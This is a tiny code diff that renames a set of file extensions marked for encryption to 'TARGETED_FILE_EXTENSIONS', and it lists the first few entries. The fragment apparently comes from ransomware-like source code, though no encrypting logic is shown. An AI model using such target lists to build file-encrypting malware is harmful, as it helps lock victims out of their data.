@@ -1,4 +1,4 @@
-VALID_FILE_EXTENSIONS_FOR_ENCRYPTION = {
+TARGETED_FILE_EXTENSIONS = {
     ".3ds",
     ".7z",
     ".accdb",
